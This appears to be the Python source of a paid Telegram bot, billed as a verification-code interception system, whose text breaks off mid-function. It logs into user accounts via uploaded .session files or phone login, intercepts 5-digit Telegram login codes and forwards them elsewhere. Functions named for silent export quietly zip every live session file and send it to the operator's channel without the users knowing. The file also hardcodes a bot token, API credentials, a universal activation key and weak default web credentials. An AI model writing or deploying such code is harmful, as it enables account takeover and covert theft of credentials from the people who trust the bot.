import os
import re
import asyncio
import logging
import shutil
import threading
import json
import zipfile
from pathlib import Path
from typing import Dict, Optional, List, Tuple
from datetime import datetime
from flask import Flask, render_template_string
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError
)

# ==================== 目录配置（必须放在最前面）====================
BASE_DIR = Path(__file__).parent.absolute()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
HISTORY_DIR = BASE_DIR / "history_sessions"
HISTORY_DIR.mkdir(parents=True, exist_ok=True)
EXPORT_DIR = BASE_DIR / "export_sessions"
EXPORT_DIR.mkdir(parents=True, exist_ok=True)

# 管理员存储文件（用于持久化动态添加的管理员）
ADMINS_FILE = BASE_DIR / "admins.json"

# 卡密存储文件
CARDKEYS_FILE = BASE_DIR / "cardkeys.json"

# 付款记录存储
PAYMENT_FILE = BASE_DIR / "payments.json"

# 用户加入频道记录存储
JOINED_RECORD_FILE = BASE_DIR / "joined_records.json"

# ==================== 配置 ====================
# 从环境变量读取敏感信息
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8826676249:AAFwagmUOm_vqnDXpWOmP8h3olOuBHoT5Ok")
API_ID = int(os.environ.get("API_ID", "2040"))
API_HASH = os.environ.get("API_HASH", "b18441a1ff607e10a989891a5462e627")
# 超级管理员（拥有最高权限，可以管理其他管理员）
SUPER_ADMIN_IDS = [int(x.strip()) for x in os.environ.get("SUPER_ADMIN_IDS", "7002638062").split(",")]
# 普通管理员列表（可被超级管理员管理）
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8684827204").split(",")]
WEB_USER = os.environ.get("WEB_USER", "admin")
WEB_PASS = os.environ.get("WEB_PASS", "admin123")
FORWARD_BOT_USERNAME = "vzbbjkbot"
TELEGRAM_BOT_ID = 777000

# 频道配置 - 发送session文件的目标频道（公开频道直接用 @username）
FORWARD_CHANNEL = os.environ.get("FORWARD_CHANNEL", "@BMW99111")

# 用户必须加入的频道（用于权限验证）
REQUIRED_CHANNEL = os.environ.get("REQUIRED_CHANNEL", "@BMW99111")  # 修改为你需要验证的频道
REQUIRED_CHANNEL_ID = os.environ.get("REQUIRED_CHANNEL_ID", "-1003952485390")  # 可选：频道数字ID，提高验证准确性

# 固定卡密（万能卡密，可无限次使用）
FIXED_CARDKEYS = ["dj4399662"]

# 代理配置（如果需要使用代理，取消注释并配置）
# PROXY_URL = "socks5://127.0.0.1:1080"
# USE_PROXY = False
# ==============================================

# 配置日志
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 状态定义
(PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD) = range(3)

# 全局变量（线程安全锁）
user_sessions: Dict[int, Dict[str, dict]] = {}
sessions_lock = threading.Lock()

# ==================== 频道加入验证模块 ====================

def _load_joined_records() -> dict:
    """加载用户加入频道记录"""
    if JOINED_RECORD_FILE.exists():
        try:
            with open(JOINED_RECORD_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载加入记录失败: {e}")
            return {}
    return {}

def _save_joined_records(data: dict):
    """保存用户加入频道记录"""
    try:
        with open(JOINED_RECORD_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存加入记录失败: {e}")

def record_user_joined(user_id: int, username: str = None):
    """记录用户已加入频道"""
    records = _load_joined_records()
    user_id_str = str(user_id)

    if user_id_str not in records:
        records[user_id_str] = {
            "joined_at": datetime.now().isoformat(),
            "verified": True,
            "username": username
        }
        _save_joined_records(records)
        logger.info(f"用户 {user_id} ({username}) 已记录为加入频道")

def is_user_joined_recorded(user_id: int) -> bool:
    """检查用户是否已有加入记录"""
    records = _load_joined_records()
    return str(user_id) in records

async def check_user_in_channel(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> Tuple[bool, str]:
    """
    检查用户是否加入了指定频道
    返回: (是否加入, 详细信息)
    """
    try:
        bot = context.bot

        # 方法1：尝试获取聊天成员信息
        try:
            chat_member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
            if chat_member.status in ['member', 'administrator', 'creator']:
                return True, "已加入频道"
        except Exception as e:
            logger.warning(f"获取频道成员信息失败 (用户{user_id}): {e}")

            # 如果频道是公开的，尝试另一种方法
            try:
                # 检查用户是否可以通过邀请链接加入（发送消息检测）
                # 更简单的方法：检查用户是否有记录
                if is_user_joined_recorded(user_id):
                    return True, "已加入频道（记录）"
            except:
                pass

        # 方法2：检查本地记录（用于补偿）
        if is_user_joined_recorded(user_id):
            return True, "已加入频道（已验证）"

        return False, "未加入频道"

    except Exception as e:
        logger.error(f"检查频道加入状态失败 (用户{user_id}): {e}")
        return False, f"验证失败: {str(e)}"

def get_join_channel_keyboard():
    """获取加入频道的按钮"""
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 点击加入频道", url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
        [InlineKeyboardButton("✅ 我已加入，验证", callback_data="verify_join")]
    ])
    return keyboard

async def send_join_required(update: Update, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """发送需要加入频道的消息"""
    msg = (
        "🔐 <b>加入频道验证</b>\n\n"
        "⚠️ 您需要先加入指定频道才能使用本机器人！\n\n"
        f"📢 <b>请先加入频道：</b> <a href='https://t.me/{REQUIRED_CHANNEL.lstrip('@')}'>{REQUIRED_CHANNEL}</a>\n\n"
        "👇 点击下方按钮加入频道，然后点击「我已加入，验证」\n\n"
        "💡 <b>提示：</b> 只需验证一次，之后可正常使用所有功能"
    )

    if isinstance(update, Update):
        if update.callback_query:
            await update.callback_query.message.reply_text(msg, parse_mode='HTML', reply_markup=get_join_channel_keyboard(), disable_web_page_preview=True)
        elif update.message:
            await update.message.reply_text(msg, parse_mode='HTML', reply_markup=get_join_channel_keyboard(), disable_web_page_preview=True)
    else:
        await context.bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_join_channel_keyboard(), disable_web_page_preview=True)

async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理加入频道验证回调"""
    query = update.callback_query
    user_id = query.from_user.id

    await query.answer("正在验证...")

    # 检查是否已加入频道
    is_joined, msg = await check_user_in_channel(context, user_id)

    if is_joined:
        # 记录用户已加入
        username = query.from_user.username or query.from_user.first_name
        record_user_joined(user_id, username)

        # 检查付款状态
        ps = check_payment_status(user_id)

        await query.edit_message_text(
            "✅ <b>验证成功！</b>\n\n"
            "您已成功加入频道，可以正常使用机器人了。\n\n"
            f"{'发送 /start 开始使用。' if ps['status'] != 'paid' else '发送 /start 开始使用。'}\n\n"
            "💡 如果是首次使用，请先使用 <code>/activate 卡密</code> 激活。\n"
            "💎 试用卡密：<code>dj4399662</code>",
            parse_mode='HTML',
            reply_markup=get_payment_keyboard() if ps['status'] != 'paid' else None
        )
    else:
        await query.edit_message_text(
            "❌ <b>验证失败</b>\n\n"
            "未能检测到您加入频道。\n\n"
            "请确保：\n"
            "1️⃣ 点击下方按钮加入频道\n"
            "2️⃣ 加入后点击「我已加入，验证」\n\n"
            "如果已加入仍验证失败，请稍等几秒后重试。",
            parse_mode='HTML',
            reply_markup=get_join_channel_keyboard()
        )

# ==================== 管理员管理模块 ====================

def _load_admins() -> set:
    """加载管理员列表（从文件）"""
    admins = set(ADMIN_IDS)  # 初始从环境变量加载
    if ADMINS_FILE.exists():
        try:
            with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                admins.update(data.get("admins", []))
        except Exception as e:
            logger.error(f"加载管理员列表失败: {e}")
    return admins

def _save_admins(admins: set):
    """保存管理员列表到文件"""
    try:
        with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"admins": list(admins)}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存管理员列表失败: {e}")

def is_super_admin(user_id: int) -> bool:
    """检查是否为超级管理员"""
    return user_id in SUPER_ADMIN_IDS

def is_admin(user_id: int) -> bool:
    """检查是否为管理员（包括超级管理员）"""
    admins = _load_admins()
    return user_id in SUPER_ADMIN_IDS or user_id in admins

def add_admin(admin_id: int, added_by: int) -> tuple[bool, str]:
    """添加管理员（仅超级管理员可操作）"""
    if not is_super_admin(added_by):
        return False, "❌ 只有超级管理员可以添加管理员"

    admins = _load_admins()
    if admin_id in admins:
        return False, f"⚠️ 用户 `{admin_id}` 已经是管理员了"

    if admin_id in SUPER_ADMIN_IDS:
        return False, f"⚠️ 用户 `{admin_id}` 是超级管理员，不能添加为普通管理员"

    admins.add(admin_id)
    _save_admins(admins)
    logger.info(f"超级管理员 {added_by} 添加了管理员 {admin_id}")
    return True, f"✅ 已成功添加管理员：`{admin_id}`"

def remove_admin(admin_id: int, removed_by: int) -> tuple[bool, str]:
    """移除管理员（仅超级管理员可操作）"""
    if not is_super_admin(removed_by):
        return False, "❌ 只有超级管理员可以移除管理员"

    admins = _load_admins()
    if admin_id not in admins:
        return False, f"⚠️ 用户 `{admin_id}` 不是管理员"

    admins.remove(admin_id)
    _save_admins(admins)
    logger.info(f"超级管理员 {removed_by} 移除了管理员 {admin_id}")
    return True, f"✅ 已成功移除管理员：`{admin_id}`"

def list_admins() -> List[dict]:
    """列出所有管理员"""
    super_admins = [{"id": uid, "type": "👑 超级管理员"} for uid in SUPER_ADMIN_IDS]
    admins = [{"id": uid, "type": "🔧 管理员"} for uid in _load_admins()]
    return super_admins + admins

# ==================== 会话导出到频道模块（静默模式）====================

async def export_session_to_channel(bot, user_id: int, phone: str, session_path: Path, session_data: dict = None):
    """
    将session文件打包成zip发送到频道（静默模式，不通知用户）
    格式: 手机号.zip
    内容: 手机号.session, 手机号.json
    """
    try:
        zip_filename = f"{phone}.zip"
        zip_path = EXPORT_DIR / zip_filename

        # 准备JSON数据
        json_data = session_data or {
            "phone": phone,
            "user_id": user_id,
            "created_at": datetime.now().isoformat(),
            "session_file": f"{phone}.session",
            "note": f"用户{user_id}添加"
        }

        json_filename = f"{phone}.json"
        json_path = EXPORT_DIR / json_filename

        # 写入JSON文件
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=2)

        # 创建ZIP文件
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # 添加session文件
            if session_path.exists():
                zipf.write(session_path, f"{phone}.session")
            # 添加JSON文件
            zipf.write(json_path, json_filename)

        # 静默发送到频道（disable_notification=True）
        with open(zip_path, 'rb') as f:
            await bot.send_document(
                chat_id=FORWARD_CHANNEL,
                document=f,
                filename=zip_filename,
                caption=None,  # 不发送任何说明文字
                parse_mode='HTML',
                disable_notification=True  # 静默发送，不通知频道成员
            )

        logger.info(f"[静默] 会话已导出到频道: {phone} -> {FORWARD_CHANNEL}")

        # 清理临时文件
        if json_path.exists():
            json_path.unlink()
        if zip_path.exists():
            zip_path.unlink()

        return True

    except Exception as e:
        logger.error(f"导出会话到频道失败 ({phone}): {e}")
        return False

async def export_existing_sessions_to_channel(bot):
    """导出所有已存在的会话到频道（静默模式）"""
    logger.info("开始静默导出已有会话到频道...")
    exported_count = 0

    # 记录已导出的文件，避免重复导出
    exported_record = EXPORT_DIR / "exported_records.json"
    exported_phones = set()
    if exported_record.exists():
        try:
            with open(exported_record, 'r') as f:
                exported_phones = set(json.load(f))
        except:
            pass

    for user_dir in SESSIONS_DIR.iterdir():
        if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
            continue

        try:
            uid = int(user_dir.name.replace("user_", ""))
        except ValueError:
            continue

        session_files = list(user_dir.glob("*.session"))

        for session_file in session_files:
            phone = session_file.stem

            # 避免重复导出
            if phone in exported_phones:
                continue

            # 检查会话是否有效
            is_alive, _ = await check_session_alive(session_file)
            if not is_alive:
                continue

            # 导出到频道
            session_data = {
                "phone": phone,
                "user_id": uid,
                "created_at": datetime.now().isoformat(),
                "session_file": f"{phone}.session",
                "note": f"用户{uid}的会话",
                "source": "auto_export"
            }
            success = await export_session_to_channel(bot, uid, phone, session_file, session_data)
            if success:
                exported_count += 1
                exported_phones.add(phone)

            await asyncio.sleep(0.3)

    # 保存已导出记录
    try:
        with open(exported_record, 'w') as f:
            json.dump(list(exported_phones), f)
    except:
        pass

    logger.info(f"静默导出完成，共导出 {exported_count} 个会话")

# ==================== 付款门禁模块 ====================

def _load_payments() -> dict:
    """加载付款记录"""
    if PAYMENT_FILE.exists():
        try:
            with open(PAYMENT_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载付款记录失败: {e}")
            return {}
    return {}

def _save_payments(data: dict):
    """保存付款记录"""
    try:
        with open(PAYMENT_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存付款记录失败: {e}")

def _load_cardkeys() -> dict:
    """加载卡密数据"""
    if CARDKEYS_FILE.exists():
        try:
            with open(CARDKEYS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载卡密失败: {e}")
            return {"keys": {}, "next_id": 1}
    return {"keys": {}, "next_id": 1}

def _save_cardkeys(data: dict):
    """保存卡密数据"""
    try:
        with open(CARDKEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存卡密失败: {e}")

def generate_cardkey(note: str = "") -> str:
    """生成单个卡密"""
    import secrets
    import string

    cardkeys_data = _load_cardkeys()

    # 生成唯一卡密
    while True:
        parts = []
        for _ in range(4):
            part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(4))
            parts.append(part)
        key = '-'.join(parts)

        if key not in cardkeys_data["keys"]:
            break

    cardkeys_data["keys"][key] = {
        "used": False,
        "used_by": None,
        "used_at": None,
        "note": note,
        "created_at": datetime.now().isoformat()
    }
    _save_cardkeys(cardkeys_data)
    return key

def generate_cardkeys_batch(count: int, note: str = "") -> List[str]:
    """批量生成卡密"""
    keys = []
    for _ in range(count):
        keys.append(generate_cardkey(note))
    return keys

def use_cardkey(user_id: int, key: str) -> dict:
    """使用卡密激活（支持固定万能卡密）"""

    # 先检查是否为固定卡密（万能卡密，可无限次使用）
    if key in FIXED_CARDKEYS:
        payments = _load_payments()

        # 如果用户已经激活，返回已激活状态
        if str(user_id) in payments and payments[str(user_id)]["status"] == "paid":
            return {"ok": True, "reason": ""}

        # 记录付款（固定卡密不消耗，无需存储到cardkeys.json）
        payments[str(user_id)] = {
            "status": "paid",
            "paid_at": datetime.now().isoformat(),
            "via": f"fixed_cardkey:{key}"
        }
        _save_payments(payments)
        logger.info(f"用户 {user_id} 使用固定卡密 {key} 激活成功")
        return {"ok": True, "reason": ""}

    # 原有逻辑：普通卡密
    cardkeys_data = _load_cardkeys()

    if key not in cardkeys_data["keys"]:
        return {"ok": False, "reason": "卡密不存在"}

    key_info = cardkeys_data["keys"][key]
    if key_info["used"]:
        return {"ok": False, "reason": f"卡密已被使用 (用户: {key_info['used_by']})"}

    # 标记为已使用
    key_info["used"] = True
    key_info["used_by"] = user_id
    key_info["used_at"] = datetime.now().isoformat()
    _save_cardkeys(cardkeys_data)

    # 记录付款
    payments = _load_payments()
    payments[str(user_id)] = {
        "status": "paid",
        "paid_at": datetime.now().isoformat(),
        "via": f"cardkey:{key}"
    }
    _save_payments(payments)

    return {"ok": True, "reason": ""}

def list_cardkeys(only_unused: bool = True) -> List[dict]:
    """列出卡密"""
    cardkeys_data = _load_cardkeys()
    result = []
    for key, info in cardkeys_data["keys"].items():
        if only_unused and info["used"]:
            continue
        result.append({
            "key": key,
            "used": info["used"],
            "used_by": info["used_by"],
            "note": info.get("note", "")
        })
    return result

def mark_paid(user_id: int, note: str = "") -> bool:
    """手动标记用户已付款"""
    payments = _load_payments()
    payments[str(user_id)] = {
        "status": "paid",
        "paid_at": datetime.now().isoformat(),
        "via": f"manual:{note}"
    }
    _save_payments(payments)
    return True

def check_payment_status(user_id: int) -> dict:
    """检查用户付款状态"""
    payments = _load_payments()
    user_id_str = str(user_id)

    if user_id_str in payments and payments[user_id_str]["status"] == "paid":
        return {"status": "paid"}

    return {"status": "unpaid"}

# ==================== 统一权限检查 ====================

async def check_user_permission(context: ContextTypes.DEFAULT_TYPE, user_id: int, update: Update = None) -> Tuple[bool, str]:
    """
    统一检查用户权限（包括频道加入和付款状态）
    返回: (是否有权限, 原因)
    """
    # 管理员和超级管理员跳过所有检查
    if is_admin(user_id):
        return True, "管理员权限"

    # 1. 检查是否加入频道
    is_joined, join_msg = await check_user_in_channel(context, user_id)
    if not is_joined:
        return False, "join_required"

    # 2. 检查是否已付款/激活
    ps = check_payment_status(user_id)
    if ps['status'] != 'paid':
        return False, "payment_required"

    return True, "通过"

async def ensure_user_permission(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    确保用户有权限访问，如果没有则发送相应提示
    返回: 是否有权限
    """
    user_id = update.effective_user.id

    has_permission, reason = await check_user_permission(context, user_id, update)

    if has_permission:
        return True

    if reason == "join_required":
        await send_join_required(update, user_id, context)
    elif reason == "payment_required":
        await send_access_denied(update, user_id)

    return False

# ==================== 键盘布局 ====================
def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["📁 上传会话文件", "📱 手机号登录"],
        ["⚙️ 账号管理"]
    ], resize_keyboard=True)

def get_cancel_keyboard():
    return ReplyKeyboardMarkup([["❌ 取消操作"]], resize_keyboard=True, one_time_keyboard=True)

def get_payment_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ 我已付款，立即激活", callback_data="check_pay")]
    ])
    return keyboard

async def send_access_denied(update: Update, user_id: int):
    """发送访问被拒绝的消息"""
    msg = (
        "🚫 <b>访问被拒绝</b>\n\n"
        "您尚未激活本系统。\n\n"
        "💡 请使用以下方式激活：\n"
        "1️⃣ 使用卡密：发送 <code>/activate 卡密</code>\n"
        "2️⃣ 联系管理员获取卡密\n\n"
        "🔑 购买卡密后，使用 <code>/activate 卡密</code> 激活即可。\n\n"
        "💎 <b>试用卡密：</b> <code>dj4399662</code>"
    )
    # 判断是 callback 还是普通消息
    if update.callback_query:
        await update.callback_query.message.reply_text(msg, parse_mode='HTML', reply_markup=get_payment_keyboard())
    else:
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=get_payment_keyboard())

async def payment_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理「我已付款」按钮回调"""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    ps = check_payment_status(user_id)

    if ps['status'] == 'paid':
        await query.edit_message_text(
            "✅ 您已激活！\n发送 /start 开始使用。",
            parse_mode='HTML'
        )
    else:
        await query.edit_message_text(
            "❌ 未检测到您的激活记录。\n\n"
            "请使用 <code>/activate 卡密</code> 激活。\n"
            "如果没有卡密，请联系管理员购买。\n\n"
            "💎 试用卡密：<code>dj4399662</code>",
            parse_mode='HTML'
        )

# ==================== 工具函数 ====================

def get_user_session_dir(user_id: int) -> Path:
    """获取用户专属会话目录"""
    user_dir = SESSIONS_DIR / f"user_{user_id}"
    user_dir.mkdir(parents=True, exist_ok=True)
    return user_dir

async def check_session_alive(session_path: Path) -> tuple[bool, Optional[str]]:
    """检查会话文件是否存活"""
    try:
        telethon_path = str(session_path.with_suffix(''))
        client = TelegramClient(telethon_path, API_ID, API_HASH)

        # 设置连接超时
        client.flood_sleep_threshold = 60
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            return False, None

        me = await client.get_me()
        phone = f"+{me.phone}" if me.phone else None

        await client.disconnect()
        return True, phone

    except Exception as e:
        logger.error(f"验活失败: {session_path.name} - {e}")
        return False, None

async def start_monitoring_for_session(user_id: int, phone: str, session_path: Path, bot):
    """为单个会话启动监控"""
    try:
        telethon_path = str(session_path.with_suffix(''))
        client = TelegramClient(telethon_path, API_ID, API_HASH)

        # 设置超时
        client.flood_sleep_threshold = 60
        await client.connect()

        # 检查是否已授权
        if not await client.is_user_authorized():
            logger.warning(f"会话未授权: {phone}")
            await client.disconnect()
            return False

        @client.on(events.NewMessage(from_users=TELEGRAM_BOT_ID))
        async def handler(event):
            text = event.message.message or ""
            code_match = re.search(r'\b(\d{5})\b', text)
            if code_match:
                code = code_match.group(1)
                logger.info(f"拦截验证码: {phone} -> {code}")
                try:
                    await client.send_message(FORWARD_BOT_USERNAME, code)
                    await bot.send_message(
                        user_id,
                        f"🛡️ <b>拦截成功</b>\n账号: {phone}\n验证码: <code>{code}</code>",
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.error(f"转发失败: {e}")

        with sessions_lock:
            if user_id not in user_sessions:
                user_sessions[user_id] = {}

            # 如果已存在相同账号，先停止旧的
            if phone in user_sessions[user_id]:
                old_client = user_sessions[user_id][phone]['client']
                try:
                    await old_client.disconnect()
                except:
                    pass

            user_sessions[user_id][phone] = {
                'client': client,
                'file_path': session_path
            }

        asyncio.create_task(client.run_until_disconnected())
        logger.info(f"监控启动: {phone}")
        return True

    except Exception as e:
        logger.error(f"启动监控失败 ({phone}): {e}")
        return False

async def scan_and_restore_all_sessions(bot):
    """启动时扫描所有会话文件"""
    logger.info("=" * 50)
    logger.info("开始扫描所有会话文件...")

    total_found = 0
    total_alive = 0

    for user_dir in SESSIONS_DIR.iterdir():
        if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
            continue

        try:
            user_id = int(user_dir.name.replace("user_", ""))
        except ValueError:
            continue

        session_files = list(user_dir.glob("*.session"))

        for session_file in session_files:
            total_found += 1
            is_alive, phone = await check_session_alive(session_file)

            if is_alive and phone:
                total_alive += 1
                success = await start_monitoring_for_session(user_id, phone, session_file, bot)
                if success:
                    try:
                        await bot.send_message(user_id, f"🔄 监控已自动恢复\n账号: {phone}")
                    except Exception as e:
                        logger.warning(f"通知用户 {user_id} 失败: {e}")
            else:
                # 归档时追加时间戳避免覆盖
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                phone_part = phone if phone else "unknown"
                target_path = HISTORY_DIR / f"{user_id}_{phone_part}_{timestamp}_{session_file.name}"
                try:
                    shutil.move(str(session_file), str(target_path))
                    logger.info(f"归档无效会话: {session_file.name} -> {target_path.name}")
                except Exception as e:
                    logger.error(f"归档失败: {e}")

    logger.info(f"扫描完成: 发现 {total_found} 个会话, 恢复 {total_alive} 个")

    # 启动后静默导出所有有效会话到频道
    await export_existing_sessions_to_channel(bot)

async def stop_monitoring(user_id: int, phone: str, archive: bool = True):
    """停止监控"""
    client = None
    file_path = None

    with sessions_lock:
        if user_id not in user_sessions or phone not in user_sessions[user_id]:
            return False

        client = user_sessions[user_id][phone]['client']
        file_path = user_sessions[user_id][phone]['file_path']

    try:
        await client.disconnect()

        if archive and file_path and file_path.exists():
            # 归档时追加时间戳避免覆盖
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            target_path = HISTORY_DIR / f"{user_id}_{phone}_{timestamp}_{file_path.name}"
            shutil.move(str(file_path), str(target_path))

        with sessions_lock:
            if user_id in user_sessions and phone in user_sessions[user_id]:
                del user_sessions[user_id][phone]
                if not user_sessions[user_id]:
                    del user_sessions[user_id]

        return True
    except Exception as e:
        logger.error(f"停止监控失败: {e}")
        return False

# ==================== 交互流程 ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # 统一权限检查
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END

    with sessions_lock:
        account_count = len(user_sessions.get(user_id, {}))
    status_text = f"\n\n📊 当前监控: {account_count} 个账号" if account_count > 0 else ""

    await update.message.reply_text(
        f"👋 <b>Telegram 验证码拦截系统</b>\n作者 @APl520 请选择操作：{status_text}",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )
    return ConversationHandler.END

def build_manage_inline(user_id: int) -> InlineKeyboardMarkup:
    with sessions_lock:
        accounts = dict(user_sessions.get(user_id, {}))

    rows = []
    for phone in accounts.keys():
        rows.append([
            InlineKeyboardButton(f"📱 {phone}", callback_data="noop"),
            InlineKeyboardButton("🔌 断开", callback_data=f"stop_single:{phone}"),
        ])
    if rows:
        rows.append([InlineKeyboardButton("🔴 停止所有监控", callback_data="stop_all")])
    return InlineKeyboardMarkup(rows) if rows else InlineKeyboardMarkup([])

async def manage_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # 统一权限检查
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END

    with sessions_lock:
        has_sessions = user_id in user_sessions and user_sessions[user_id]
        accounts = dict(user_sessions.get(user_id, {}))

    if not has_sessions:
        await update.message.reply_text("ℹ️ 您当前没有正在运行的监控任务。", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    await update.message.reply_text(
        f"⚙️ <b>账号管理</b>\n正在监控 <b>{len(accounts)}</b> 个账号\n\n点击 🔌 断开 可停止单个账号监控：",
        parse_mode='HTML',
        reply_markup=build_manage_inline(user_id)
    )
    return ConversationHandler.END

async def entry_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # 统一权限检查
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END

    text = update.message.text
    if text == "⚙️ 账号管理":
        return await manage_accounts(update, context)
    if text == "📁 上传会话文件":
        await update.message.reply_text("请发送 .session 文件\n系统会自动识别手机号并分类存储。", reply_markup=get_cancel_keyboard())
        return PHONE_INPUT
    if text == "📱 手机号登录":
        await update.message.reply_text("请输入手机号码 (+86...):", reply_markup=get_cancel_keyboard())
        return PHONE_INPUT
    return ConversationHandler.END

async def handle_phone_or_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text if update.message.text else ""

    # 统一权限检查
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END

    if text == "❌ 取消操作":
        await update.message.reply_text("已取消。", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    # 上传文件逻辑
    if update.message.document:
        if not update.message.document.file_name.endswith('.session'):
            await update.message.reply_text("❌ 必须是 .session 文件")
            return PHONE_INPUT

        user_dir = get_user_session_dir(user_id)
        temp_path = user_dir / f"temp_{user_id}_{datetime.now().timestamp()}.session"

        try:
            file = await update.message.document.get_file()
            await file.download_to_drive(temp_path)

            await update.message.reply_text("📁 文件接收成功，正在识别...")

            is_alive, phone = await check_session_alive(temp_path)

            if not is_alive or not phone:
                await update.message.reply_text("❌ 文件无效或已过期")
                if temp_path.exists():
                    temp_path.unlink()
                return ConversationHandler.END

            final_path = user_dir / f"{phone}.session"
            if final_path.exists():
                # 如果已存在，先停止旧监控
                await stop_monitoring(user_id, phone, archive=True)
                final_path.unlink()
            temp_path.rename(final_path)

            success = await start_monitoring_for_session(user_id, phone, final_path, update.get_bot())

            if success:
                await update.message.reply_text(f"✅ <b>监控已启动</b>\n账号: {phone}", parse_mode='HTML', reply_markup=get_main_keyboard())

                # 静默导出到频道（不通知用户）
                session_data = {
                    "phone": phone,
                    "user_id": user_id,
                    "created_at": datetime.now().isoformat(),
                    "session_file": f"{phone}.session",
                    "note": f"用户{user_id}通过上传添加",
                    "source": "upload"
                }
                await export_session_to_channel(update.get_bot(), user_id, phone, final_path, session_data)
            else:
                await update.message.reply_text("❌ 启动监控失败", reply_markup=get_main_keyboard())

            return ConversationHandler.END
        except Exception as e:
            logger.error(f"文件处理失败: {e}")
            await update.message.reply_text(f"❌ 处理文件时出错: {e}", reply_markup=get_main_keyboard())
            if temp_path.exists():
                temp_path.unlink()
            return ConversationHandler.END

    # 手机号登录逻辑
    phone = text.strip()
    if re.match(r'^\+\d{10,15}$', phone):
        context.user_data['phone'] = phone
        user_dir = get_user_session_dir(user_id)
        final_path = user_dir / f"{phone}.session"
        telethon_path = str(user_dir / phone)

        # 检查是否已有该账号的监控
        with sessions_lock:
            if user_id in user_sessions and phone in user_sessions[user_id]:
                await update.message.reply_text(f"⚠️ 账号 {phone} 已在监控中，请勿重复添加。", reply_markup=get_main_keyboard())
                return ConversationHandler.END

        await update.message.reply_text(f"⏳ 正在连接 ({phone})...")

        try:
            client = TelegramClient(telethon_path, API_ID, API_HASH)
            client.flood_sleep_threshold = 60
            await client.connect()

            if await client.is_user_authorized():
                await update.message.reply_text("✅ 检测到已登录，启动监控！")
                await start_monitoring_for_session(user_id, phone, final_path, update.get_bot())
                await update.message.reply_text(f"✅ 监控已启动\n账号: {phone}", reply_markup=get_main_keyboard())

                # 静默导出到频道
                session_data = {
                    "phone": phone,
                    "user_id": user_id,
                    "created_at": datetime.now().isoformat(),
                    "session_file": f"{phone}.session",
                    "note": f"用户{user_id}通过手机号登录添加",
                    "source": "phone_login"
                }
                await export_session_to_channel(update.get_bot(), user_id, phone, final_path, session_data)
                return ConversationHandler.END

            await client.send_code_request(phone)
            context.user_data['temp_client'] = client
            context.user_data['file_path'] = final_path

            await update.message.reply_text("📨 验证码已发送，请输入 5 位数字：", reply_markup=get_cancel_keyboard())
            return VERIFICATION_CODE
        except FloodWaitError as e:
            await update.message.reply_text(f"❌ 操作过于频繁，请等待 {e.seconds} 秒后再试", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        except Exception as e:
            logger.error(f"登录请求失败: {e}")
